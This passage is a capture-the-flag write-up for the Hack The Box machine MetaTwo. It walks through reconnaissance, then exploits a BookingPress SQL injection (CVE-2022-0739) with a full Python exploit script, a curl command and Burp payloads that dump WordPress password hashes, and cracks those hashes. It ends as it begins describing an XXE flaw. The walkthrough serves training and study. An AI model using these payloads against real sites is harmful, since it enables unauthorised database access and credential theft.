+          <span class="md-nav__icon md-icon"></span>
+          Pentesting mobile
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../setting-up-mobile-penstesting/" class="md-nav__link">
+        Setting up the mobile pentesting environment
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../todolist/" class="md-nav__link">
+        To-do list
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#about-the-machine" class="md-nav__link">
+    About the machine
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#getting-usertxt-flag" class="md-nav__link">
+    Getting user.txt flag
+  </a>
+  
+    <nav class="md-nav" aria-label="Getting user.txt flag">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#reconnaissance" class="md-nav__link">
+    Reconnaissance
+  </a>
+  
+    <nav class="md-nav" aria-label="Reconnaissance">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#active-scanning-serviceport-enumeration" class="md-nav__link">
+    Active Scanning: Service/Port enumeration
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#initial-access" class="md-nav__link">
+    Initial access
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#getting-the-systems-flag" class="md-nav__link">
+    Getting the System's flag
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#some-other-write-ups-and-learning-material-related" class="md-nav__link">
+    Some other write-ups and learning material related
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+
+
+
+  <h1>metatwo</h1>
+
+<h2 id="about-the-machine">About the machine</h2>
+<p><img alt="Metatwo Machine Banner" src="../img/metatwo.png" /></p>
+<table>
+<thead>
+<tr>
+<th>data</th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Machine</td>
+<td>Metatwo</td>
+</tr>
+<tr>
+<td>Platform</td>
+<td>Hackthebox</td>
+</tr>
+<tr>
+<td>url</td>
+<td><a href="https://app.hackthebox.com/machines/MetaTwo">link</a></td>
+</tr>
+<tr>
+<td>creator</td>
+<td><a href="https://app.hackthebox.com/users/27582">Naute</a></td>
+</tr>
+<tr>
+<td>OS</td>
+<td>Linux</td>
+</tr>
+<tr>
+<td>Release data</td>
+<td>29 october 2022</td>
+</tr>
+<tr>
+<td>Difficulty</td>
+<td>Easy</td>
+</tr>
+<tr>
+<td>Points</td>
+<td>20</td>
+</tr>
+<tr>
+<td>ip</td>
+<td>10.10.11.186</td>
+</tr>
+</tbody>
+</table>
+<h2 id="getting-usertxt-flag">Getting user.txt flag</h2>
+<p>Run:</p>
+<pre><code class="language-bash">export ip=10.10.11.186
+</code></pre>
+<h3 id="reconnaissance">Reconnaissance</h3>
+<h4 id="active-scanning-serviceport-enumeration">Active Scanning: Service/Port enumeration</h4>
+<p>Run nmap to enumerate open ports, services, OS, and traceroute. General enumeration not to make too much noise:</p>
+<pre><code class="language-bash">sudo nmap $ip -Pn
+</code></pre>
+<p>Results:</p>
+<pre><code>PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+</code></pre>
+<p>Open 10.10.11.186 in the browser. A redirection to http://metapress.htb occurs, but the server is not found. So we add this routing in our /etc/hosts file:</p>
+<p>Open the /etc/hosts file with an editor. For instance, nano.</p>
+<pre><code class="language-bash">sudo nano /etc/hosts
+</code></pre>
+<p>Move the cursor to the end and add these lines:</p>
+<pre><code>10.10.11.186    metapress.htb
+</code></pre>
+<p>Now we can visit the site. The first thing we notice is that it is a WordPress. That means we can use a tool such as wpscan to enumerate resources in the target. As we desire also to know the installed plugins, we will perform an aggressive scan with the flag --plugins-detection. </p>
+<p>First, do the  generic scan:</p>
+<pre><code class="language-bash">wpscan --url http://metapress.htb
+</code></pre>
+<p>Results:</p>
+<pre><code>_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.22
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://metapress.htb/ [10.10.11.186]
+[+] Started: Sun Nov 13 14:58:36 2022
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entries:
+ |  - Server: nginx/1.18.0
+ |  - X-Powered-By: PHP/8.0.24
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] robots.txt found: http://metapress.htb/robots.txt
+ | Interesting Entries:
+ |  - /wp-admin/
+ |  - /wp-admin/admin-ajax.php
+ | Found By: Robots Txt (Aggressive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://metapress.htb/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://metapress.htb/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://metapress.htb/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://metapress.htb/feed/, &lt;generator&gt;https://wordpress.org/?v=5.6.2&lt;/generator&gt;
+ |  - http://metapress.htb/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.6.2&lt;/generator&gt;
+
+[+] WordPress theme in use: twentytwentyone
+ | Location: http://metapress.htb/wp-content/themes/twentytwentyone/
+ | Last Updated: 2022-11-02T00:00:00.000Z
+ | Readme: http://metapress.htb/wpcontent/themes/twentytwentyone/readme.txt
+ | [!] The version is out of date, the latest version is 1.7
+ | Style URL: http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1
+ | Style Name: Twenty Twenty-One
+ | Style URI: https://wordpress.org/themes/twentytwentyone/
+ | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ | Confirmed By: Css Style In 404 Page (Passive Detection)
+ |
+ | Version: 1.1 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://metapress.htb/wp-content/themes/twentytwentyone/style.css?ver=1.1, Match: 'Version: 1.1'
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:11 &lt;========================================================&gt; (137 / 137) 100.00% Time: 00:00:11
+
+[i] No Config Backups Found.
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+</code></pre>
+<p>Two interesting facts that may come into use later are:</p>
+<ul>
+<li>WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).</li>
+<li>X-Powered-By: PHP/8.0.24</li>
+</ul>
+<p>So, we have a WordPress version 5.6.2 that is using a PHP version 8.0.24.</p>
+<p>After this, use the aggressive method to scan plugins:</p>
+<pre><code class="language-bash">wpscan --url http://metapress.htb --enumerate vp --plugins-detection aggressive
+</code></pre>
+<p>Since this method is really slow, we have some spare time to have a look at the html code with the inspector tool in our browser. This specific line catches our attention:</p>
+<pre><code>&lt;link rel=&quot;stylesheet&quot; id=&quot;bookingpress_fonts_css-css&quot; href=&quot;http://metapress.htb/wp-content/plugins/bookingpress-appointment-booking/css/fonts/fonts.css?ver=1.0.10&quot; media=&quot;all&quot;&gt;
+</code></pre>
+<p>Sweet. In a very easy way, we've been able to spot an installed plugin and its version: bookingpress version 1.0.10. If we browse the site it's easy to get to http://metapress.htb/events/. Bookingpress plugin version 1.0.10 is vulnerable, so next step will be exploitation.</p>
+<h3 id="initial-access">Initial access</h3>
+<p>By searching for "bookingpress 1.0.10" in google, we can learn that there is a critical vulnerability associated with the plugin BookingPress version under 1.0.11. </p>
+<p>Description of CVE-2022-0739: The plugin fails to properly sanitize user supplied POST data before it is used in a dynamically constructed SQL query via the bookingpress_front_get_category_services AJAX action (available to unauthenticated users), leading to an unauthenticated SQL Injection.</p>
+<p>We are going to exploit the vulnerability in three different ways:</p>
+<ul>
+<li>Using a python script.</li>
+<li>Using the curl command.</li>
+<li>Using a capture in Burp Suite.</li>
+</ul>
+<p>We will leave out of this write-up the tool sqlmap, that authomatizes the attack. Let's get dirty hands with code.</p>
+<p><strong>Python script</strong>
+There is a <a href="https://github.com/destr4ct/CVE-2022-0739">git repo</a> that exploits CVE-2022-0739. </p>
+<p>Let's see the python script:</p>
+<pre><code class="language-python">import requests
+from json import loads
+from random import randint
+from argparse import ArgumentParser
+
+p = ArgumentParser()
+p.add_argument('-u', '--url', dest='url', help='URL of wordpress server with vulnerable plugin (http://example.domain)', required=True)
+p.add_argument('-n', '--nonce', dest='nonce', help='Nonce that you got as unauthenticated user', required=True)
+
+trigger = &quot;) UNION ALL SELECT @@VERSION,2,3,4,5,6,7,count(*),9 from wp_users-- -&quot;
+gainer = ') UNION ALL SELECT user_login,user_email,user_pass,NULL,NULL,NULL,NULL,NULL,NULL from wp_users limit 1 offset {off}-- -'
+
+# Payload: ) AND ... -- - total(9)
+def gen_payload(nonce, sqli_postfix, category_id=1):
+    return { 
+        'action': 'bookingpress_front_get_category_services', # vulnerable action,
+        '_wpnonce': nonce,
+        'category_id': category_id,
+        'total_service': f'{randint(100, 10000)}{sqli_postfix}'
+    }
+
+if __name__ == '__main__':  
+    print('- BookingPress PoC')
+    i = 0
+    args = p.parse_args()
+    url, nonce = args.url, args.nonce
+    pool = requests.session()
+
+
+    # Check if the target is vulnerable
+    v_url = f'{url}/wp-admin/admin-ajax.php'
+    proof_payload = gen_payload(nonce, trigger)
+
+    res = pool.post(v_url, data=proof_payload)
+    try:
+        res = list(loads(res.text)[0].values())
+    except Exception as e:
+        print('-- Got junk... Plugin not vulnerable or nonce is incorrect')
+        exit(-1)
+    cnt = int(res[7])
+
+    # Capture hashes
+    print('-- Got db fingerprint: ', res[0])
+    print('-- Count of users: ', cnt)
+    for i in range(cnt):
+        try:
+            # Generate payload
+            user_payload = gen_payload(nonce, gainer.format(off=i))
+            u_data = list(loads(pool.post(v_url, user_payload).text)[0].values())
+            print(f'|{u_data[0]}|{u_data[1]}|{u_data[2]}|')
+        except: continue 
+</code></pre>
+<p>Create a python script called bookingpress.py and give it execution permission:</p>
+<pre><code class="language-bash">sudo nano bookingpress.py
+# Now we paste the code and save changes with CTRL-X and Yes.
+chmod +x bookingpress.py
+</code></pre>
+<p>Bookingpress.py requires two arguments. First is "url" and second in "nonce". Wpnonce is generated during the registration of an event in the browser. To obtain it, book a spot in the calendar and capture that with BurpSuite. Here is the traffic intercepted:</p>
+<pre><code>POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: metapress.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 95
+Origin: http://metapress.htb
+Connection: close
+Referer: http://metapress.htb/events/
+Cookie: PHPSESSID=akporp33a92q48gn0afe6akrkt
+
+action=bookingpress_front_get_timings&amp;service_id=1&amp;selected_date=2022-11-21&amp;_wpnonce=f26ed88649
+</code></pre>
+<p>Now execute the script:</p>
+<pre><code class="language-bash">python bookingpress.py -u metapress.htb -n f26ed88649
+</code></pre>
+<p>And results:</p>
+<pre><code>- BookingPress PoC
+-- Got db fingerprint:  10.5.15-MariaDB-0+deb11u1
+-- Count of users:  2
+|admin|admin@metapress.htb|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.|
+|manager|manager@metapress.htb|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|
+</code></pre>
+<p><strong>Curl command</strong>
+Also, we could use the following command:</p>
+<pre><code class="language-bash">curl -i 'http://metapress.htb/wp-admin/admin-ajax.php'   --data 'action=bookingpress_front_get_category_services&amp;_wpnonce=f26ed88649&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT group_concat(user_login),group_concat(user_pass),@@version_compile_os,1,2,3,4,5,6 from wp_users-- -'
+</code></pre>
+<p>If you use it, remember to change the value of the NONCE parameter. Mine was f26ed88649.</p>
+<p><strong>Capturing the request with Burp</strong></p>
+<p>First, capture a request for an appointment booking with Burp Suite: </p>
+<pre><code>POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: metapress.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1054
+Origin: http://metapress.htb
+Connection: close
+Referer: http://metapress.htb/events/
+Cookie: PHPSESSID=1gj5nr7mj3do8f4jr4j5dh0e9d
+
+action=bookingpress_before_book_appointment&amp;appointment_data[selected_category]=1&amp;appointment_data[selected_cat_name]=&amp;appointment_data[selected_service]=1&amp;appointment_data[selected_service_name]=Startupmeeting&amp;appointment_data[selected_service_price]=$0.00&amp;appointment_data[service_price_without_currency]=0'-7502)+UNION+ALL+SELECT+group_concat(user_login),group_concat(user_pass),%40%40version_compile_os,1,2,3,4,5,6+from+wp_users--+-'&amp;appointment_data[selected_date]=2022-11-15&amp;appointment_data[selected_start_time]=10:00&amp;appointment_data[selected_end_time]=10:30&amp;appointment_data[customer_name]=&amp;appointment_data[customer_firstname]=lolo&amp;appointment_data[customer_lastname]=lolo&amp;appointment_data[customer_phone]=7777777777&amp;appointment_data[customer_email]=lolo@lolo.com&amp;appointment_data[appointment_note]=&lt;script&gt;alert(1)&lt;/script&gt;&amp;appointment_data[selected_payment_method]=&amp;appointment_data[customer_phone_country]=US&amp;appointment_data[total_services]=&amp;appointment_data[stime]=1668426666&amp;appointment_data[spam_captcha]=In6ygQvJD9EB&amp;_wpnonce=da775e35c6
+</code></pre>
+<p>As you can see in the captured traffic, since I restarted my machine due to non related issues, my wpnonce has shifted from f26ed88649 to da775e35c6. Send this request to the Repeater module (CTRL-R) and play with it. After a while testing it, I could craft this request:</p>
+<pre><code>POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: metapress.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 112
+Origin: http://metapress.htb
+Connection: close
+Referer: http://metapress.htb/events/
+Cookie: PHPSESSID=1gj5nr7mj3do8f4jr4j5dh0e9d
+
+action=bookingpress_front_get_category_services&amp;_wpnonce=da775e35c6&amp;category_id=33&amp;total_service=9)+OR+1=1;--+-'
+</code></pre>
+<p>For that, we have this response:</p>
+<pre><code>HTTP/1.1 200 OK
+Server: nginx/1.18.0
+Date: Mon, 14 Nov 2022 08:20:06 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+X-Powered-By: PHP/8.0.24
+Access-Control-Allow-Origin: http://metapress.htb
+Access-Control-Allow-Credentials: true
+X-Robots-Tag: noindex
+X-Content-Type-Options: nosniff
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Cache-Control: no-cache, must-revalidate, max-age=0
+X-Frame-Options: SAMEORIGIN
+Referrer-Policy: strict-origin-when-cross-origin
+Content-Length: 553
+
+[{&quot;bookingpress_service_id&quot;:&quot;1&quot;,&quot;bookingpress_category_id&quot;:&quot;1&quot;,&quot;bookingpress_service_name&quot;:&quot;Startup meeting&quot;,&quot;bookingpress_service_price&quot;:&quot;$0.00&quot;,&quot;bookingpress_service_duration_val&quot;:&quot;30&quot;,&quot;bookingpress_service_duration_unit&quot;:&quot;m&quot;,&quot;bookingpress_service_description&quot;:&quot;Join us, we will celebrate our startup!&quot;,&quot;bookingpress_service_position&quot;:&quot;0&quot;,&quot;bookingpress_servicedate_created&quot;:&quot;2022-06-23 18:02:38&quot;,&quot;service_price_without_currency&quot;:0,&quot;img_url&quot;:&quot;http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg&quot;}]
+</code></pre>
+<p>Cool. Let's now check what happens when you use this payload:</p>
+<pre><code>HTTP/1.1 200 OK
+Server: nginx/1.18.0
+Date: Mon, 14 Nov 2022 08:22:46 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+X-Powered-By: PHP/8.0.24
+Access-Control-Allow-Origin: http://metapress.htb
+Access-Control-Allow-Credentials: true
+X-Robots-Tag: noindex
+X-Content-Type-Options: nosniff
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Cache-Control: no-cache, must-revalidate, max-age=0
+X-Frame-Options: SAMEORIGIN
+Referrer-Policy: strict-origin-when-cross-origin
+Content-Length: 2
+
+[]
+</code></pre>
+<p>So, when the condition is false (1=2), we are having a different response from the server. This proves that we are facing a SQL Injection vulnerability.</p>
+<p>Also, we could run a scanner with the tool <strong>sqlmap</strong> to see if this request is vulnerable. Save this request in a file (in my case I will call it bookrequest:</p>
+<pre><code>POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: metapress.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 112
+Origin: http://metapress.htb
+Connection: close
+Referer: http://metapress.htb/events/
+Cookie: PHPSESSID=1gj5nr7mj3do8f4jr4j5dh0e9d
+
+action=bookingpress_front_get_category_services&amp;_wpnonce=da775e35c6&amp;category_id=33&amp;total_service=9
+</code></pre>
+<p>Now run sqlmap:</p>
+<pre><code class="language-bash">sqlmap -r bookrequest
+</code></pre>
+<p>Extract from the results:</p>
+<pre><code>[03:30:05] [INFO] POST parameter 'total_service' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+POST parameter 'total_service' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+sqlmap identified the following injection point(s) with a total of 436 HTTP(s) requests:
+---
+Parameter: total_service (POST)
+    Type: time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: action=bookingpress_front_get_category_services&amp;_wpnonce=da775e35c6&amp;category_id=33&amp;total_service=9) AND (SELECT 2533 FROM (SELECT(SLEEP(5)))kDHj) AND (2027=2027
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 9 columns
+    Payload: action=bookingpress_front_get_category_services&amp;_wpnonce=da775e35c6&amp;category_id=33&amp;total_service=9) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716a717071,0x467874624e5a4862654847417a50625064757853724c584c57504443685668756446725643566d56,0x7171627a71),NULL,NULL-- -
+---
+[03:30:17] [INFO] the back-end DBMS is MySQL
+web application technology: Nginx 1.18.0, PHP 8.0.24
+back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)
+[03:30:17] [WARNING] HTTP error codes detected during run:
+400 (Bad Request) - 123 times
+[03:30:17] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/metapress.htb'
+</code></pre>
+<p>This saves us some time. Now we know there are two SQLi vulnerabilities. The first is a time-based blind one. And the second one is a SQL injection based on a UNION QUERY. Also, we know the query is on a table with 9 columns, being the seventh one the injectable. </p>
+<p>We could have also used the Repeater module in Burp Suite and sent a request for 9 columns and for 10 columns (I will only paste the payload):</p>
+<pre><code># payload of 9 columns. In case of an empty response, the table would have 8 columns.
+
+action=bookingpress_front_get_category_services&amp;_wpnonce=da775e35c6&amp;category_id=33&amp;total_service=9)+OR+1=1+order+by+9;--+-
+
+# payload of 10 columns. In case of an empty response, the table would have 9 columns.
+
+action=bookingpress_front_get_category_services&amp;_wpnonce=da775e35c6&amp;category_id=33&amp;total_service=9)+OR+1=1+order+by+10;--+-
+</code></pre>
+<p>Since we have an empty response with 10 columns we can conclude that the table has 9 columns. </p>
+<p>To get which columns are being displayed, use this payload:</p>
+<pre><code>action=bookingpress_front_get_category_services&amp;_wpnonce=da775e35c6&amp;category_id=33&amp;total_service=9)+UNION+SELECT+all+1,2,3,4,5,6,7,8,9;--+-
+</code></pre>
+<p>In the body of the response, we obtain:</p>
+<pre><code>
+[{&quot;bookingpress_service_id&quot;:&quot;1&quot;,&quot;bookingpress_category_id&quot;:&quot;2&quot;,&quot;bookingpress_service_name&quot;:&quot;3&quot;,&quot;bookingpress_service_price&quot;:&quot;$4.00&quot;,&quot;bookingpress_service_duration_val&quot;:&quot;5&quot;,&quot;bookingpress_service_duration_unit&quot;:&quot;6&quot;,&quot;bookingpress_service_description&quot;:&quot;7&quot;,&quot;bookingpress_service_position&quot;:&quot;8&quot;,&quot;bookingpress_servicedate_created&quot;:&quot;9&quot;,&quot;service_price_without_currency&quot;:4,&quot;img_url&quot;:&quot;http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg&quot;}]
+</code></pre>
+<p>All of the columns are being displayed, and this makes sense since it is a UNION query.</p>
+<p>Now we are ready to perfom our attack using Burpsuite. These would be the succesive payloads:</p>
+<pre><code># 1. Get the names of the databases:
+
+action=bookingpress_front_get_category_services&amp;_wpnonce=da775e35c6&amp;category_id=33&amp;total_service=9)+UNION+SELECT+table_schema,null,null,null,null,null,null,null,null+FROM+information_schema.tables;--+-
+
+# Body of the response:
+
+[{&quot;bookingpress_service_id&quot;:&quot;information_schema&quot;,&quot;bookingpress_category_id&quot;:null,&quot;bookingpress_service_name&quot;:null,&quot;bookingpress_service_price&quot;:&quot;$0.00&quot;,&quot;bookingpress_service_duration_val&quot;:null,&quot;bookingpress_service_duration_unit&quot;:null,&quot;bookingpress_service_description&quot;:null,&quot;bookingpress_service_position&quot;:null,&quot;bookingpress_servicedate_created&quot;:null,&quot;service_price_without_currency&quot;:0,&quot;img_url&quot;:&quot;http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg&quot;},{&quot;bookingpress_service_id&quot;:&quot;blog&quot;,&quot;bookingpress_category_id&quot;:null,&quot;bookingpress_service_name&quot;:null,&quot;bookingpress_service_price&quot;:&quot;$0.00&quot;,&quot;bookingpress_service_duration_val&quot;:null,&quot;bookingpress_service_duration_unit&quot;:null,&quot;bookingpress_service_description&quot;:null,&quot;bookingpress_service_position&quot;:null,&quot;bookingpress_servicedate_created&quot;:null,&quot;service_price_without_currency&quot;:0,&quot;img_url&quot;:&quot;http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg&quot;}]
+
+# 2. Get the names of all tables from the selected database:
+
+action=bookingpress_front_get_category_services&amp;_wpnonce=da775e35c6&amp;category_id=33&amp;total_service=9)+UNION+SELECT+table_name,null,null,null,null,null,null,null,null+FROM+information_schema.tables+WHERE+table_schema=blog;--+-
+
+# But since we are having some issues when using &quot;WHERE&quot; we will dump the database. 
+
+action=bookingpress_front_get_category_services&amp;_wpnonce=da775e35c6&amp;category_id=33&amp;total_service=9)+UNION+SELECT+null,null,null,null,null,null,null,null,table_name+FROM+information_Schema.tables;--+-
+
+# This will give us an extended response from where we need to read and select the interesting table. We will use filters in BurpSuite to locate all results related to USERS. And, as matter of fact we can locate a specific table (the common one in WordPress, by the way): wp_users. We will use this later.
+
+# 3. Get the name of all columns of a selected table from a selected database. But since we are having problems using WHERE, we will dump all columns names:
+
+action=bookingpress_front_get_category_services&amp;_wpnonce=da775e35c6&amp;category_id=33&amp;total_service=9)+UNION+SELECT+column_name,null,null,null,null,null,null,null,null+FROM+information_schema.columns;--+-
+
+# Again, the response is vast. We can use Burpsuite filter to find these two colums: user_pass and user_login
+
+# 4. Now we can query the two columns we want (user_login and user_pass) from the table wp_users:
+
+action=bookingpress_front_get_category_services&amp;_wpnonce=da775e35c6&amp;category_id=33&amp;total_service=9)+UNION+SELECT+user_login,user_pass,null,null,null,null,null,null,null+FROM+wp_users;--+-
+
+# And the body response:
+
+[{&quot;bookingpress_service_id&quot;:&quot;admin&quot;,&quot;bookingpress_category_id&quot;:&quot;$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.&quot;,&quot;bookingpress_service_name&quot;:null,&quot;bookingpress_service_price&quot;:&quot;$0.00&quot;,&quot;bookingpress_service_duration_val&quot;:null,&quot;bookingpress_service_duration_unit&quot;:null,&quot;bookingpress_service_description&quot;:null,&quot;bookingpress_service_position&quot;:null,&quot;bookingpress_servicedate_created&quot;:null,&quot;service_price_without_currency&quot;:0,&quot;img_url&quot;:&quot;http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg&quot;},{&quot;bookingpress_service_id&quot;:&quot;manager&quot;,&quot;bookingpress_category_id&quot;:&quot;$P$B4aNM28N0E.tMy\/JIcnVMZbGcU16Q70&quot;,&quot;bookingpress_service_name&quot;:null,&quot;bookingpress_service_price&quot;:&quot;$0.00&quot;,&quot;bookingpress_service_duration_val&quot;:null,&quot;bookingpress_service_duration_unit&quot;:null,&quot;bookingpress_service_description&quot;:null,&quot;bookingpress_service_position&quot;:null,&quot;bookingpress_servicedate_created&quot;:null,&quot;service_price_without_currency&quot;:0,&quot;img_url&quot;:&quot;http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg&quot;}]
+</code></pre>
+<p>Same results:</p>
+<table>
+<thead>
+<tr>
+<th>user_login</th>
+<th>user_pass</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>admin</td>
+<td>$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.</td>
+</tr>
+<tr>
+<td>manager</td>
+<td>$P$B4aNM28N0E.tMy\/JIcnVMZbGcU16Q70</td>
+</tr>
+</tbody>
+</table>
+<p>We are going to use the tool <a href="https://github.com/drwetter/JohnTheRipper">JohnTheRipper</a> and the dictionary rockyou.txt to crack the hash.</p>
+<p>Let's first create the file book.hash with the hashes we just found.</p>
+<pre><code>nano book.hash
+</code></pre>
+<p>We copy paste the hashes in different lines:</p>
+<p>```
+$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
+$P$B4aNM28N0E.tMy\/JIcnVMZbGcU16Q70</p>
+<pre><code>
+Press CTRL-X and enter Yes.
+
+Now run johntheripper:
+
+
+```bash
+john -w=/usr/share/wordlists/rockyou.txt book.hash 
+</code></pre>
+<p>Results:</p>
+<pre><code>
+</code></pre>
+<p>Log in into http://metapress.htb/wp-admin with the credentials of manager. After doing so, we realize that manager is a limited user. It does not have admin rights, ok, but the user manager can upload media.</p>
+<p>After a little bit of research (reading documentation from <a href="https://wpscan.com/wordpress/562">wpscan.com</a> we can see that it exists a specific vulnerability for:</p>
+<ul>
+<li>a logged user who has enabled media uploading.</li>
+<li>wordpress version 5.6.2</li>
+<li>PHP version 8</li>
+</ul>
+<p>Since, our user falls into those parameters let's going to read a little bit more about that vulnerability. <a href="https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5">Read here</a>. Quoting:</p>
+<p><strong>Description</strong>: A user with the ability to upload files (like an Author) can exploit an XML parsing issue in the Media Library leading to XXE attacks. WordPress used an audio parsing library called ID3 that was affected by an XML External Entity (XXE) vulnerability affecting PHP versions 8 and above. This particular vulnerability could be triggered when parsing WAVE audio files. Researchers at security firm SonarSource discovered this XML external entity injection (XXE) security flaw in the WordPress Media Library.</p>
+<p>Impact: </p>
+<ul>
+<li><em>Arbitrary File Disclosure</em>: The contents of any file on the host’s file system could be retrieved, e.g. wp-config.php which contains sensitive data such as database credentials.</li>
